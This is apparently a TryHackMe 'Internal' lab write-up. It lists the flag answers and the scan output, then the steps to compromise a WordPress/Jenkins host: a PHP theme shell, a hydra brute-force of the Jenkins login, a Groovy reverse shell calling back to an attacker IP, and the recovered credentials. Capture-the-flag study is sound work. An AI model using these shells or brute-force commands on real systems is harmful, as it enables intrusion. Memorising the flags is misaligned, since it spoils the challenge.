# Internal
##### Question 1: User Flag
Answer
```bash
THM{int3rna1_fl4g_1}
```

##### Question 2: Root Flag
Answer
```bash
THM{d0ck3r_d3str0y3r}
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Nmap Scan:
```bash

Nmap scan report for 10.10.232.80
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   37.45 ms  10.6.0.1
2   ... 3
4   105.86 ms 10.10.232.80

```

Host name - internal.thm

Wordpress Valid creds: admin:my2boys

Add PHP shell in 404 not found page in theme for shell

python -c 'import pty; pty.spawn("/bin/bash")'

File /opt/wp-save.txt gave creds to aubreanna
```bash
aubreanna:bubb13guM!@#123
```

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

```brute force Jenkins Login
hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt

admin:spongebob
```

Jenkins Rev Shell
```bash
String host="10.6.32.32";
int port=1111;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```


File /opt/note.txt gave creds to root
```bash
root:tr0ub13guM!@#123
```